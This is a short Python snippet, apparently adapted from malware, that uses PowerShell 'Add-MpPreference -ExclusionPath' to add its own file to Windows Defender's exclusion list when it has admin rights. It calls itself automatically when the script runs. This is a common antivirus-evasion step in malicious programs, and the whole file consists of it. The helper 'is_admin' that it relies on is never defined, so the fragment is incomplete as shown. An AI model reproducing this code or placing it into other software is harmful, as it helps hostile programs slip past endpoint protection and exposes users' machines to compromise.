# adapted by me

import os

def add_to_exclusions():
    try:
        if is_admin():
            os.system(f'powershell Add-MpPreference -ExclusionPath "{__file__}"')
            print("Added to exclusions!")
        else:
            print("You need to be an admin to do this!")
    except Exception as e:
        print("An error occurred while adding to exclusions:")
        print(str(e))

add_to_exclusions()
